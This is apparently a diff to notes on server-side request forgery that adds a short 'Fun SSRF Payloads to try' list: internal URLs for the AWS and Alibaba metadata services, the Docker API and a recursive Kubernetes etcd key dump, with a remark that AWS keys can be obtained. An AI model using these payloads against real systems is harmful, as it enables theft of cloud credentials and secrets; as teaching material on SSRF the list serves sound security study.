@@ -33,3 +33,35 @@ Database HTTP interfaces - NoSQL database such as MongoDB provide REST interface
 If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data Internal REST interfaces
 
 Files - The attacker may be able to read files using file:// URIs The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.
+
+Fun SSRF Payloads to try....
+
+AWS
+
+```
+http://169.254.169.254/latest/user-data/
+```
+
+If iam is present then its party time you can get AWS keys.
+
+Alibaba
+
+``
+http://100.100.100.200/latest/meta-data/
+``
+
+Docker
+
+```
+http://127.0.0.1:2375/v1.24/containers/json
+``
+List Containers
+
+Kubernetes ETCD
+
+```
+http://127.0.0.1:2379/v2/keys/?recursive=true
+```
+
+
+
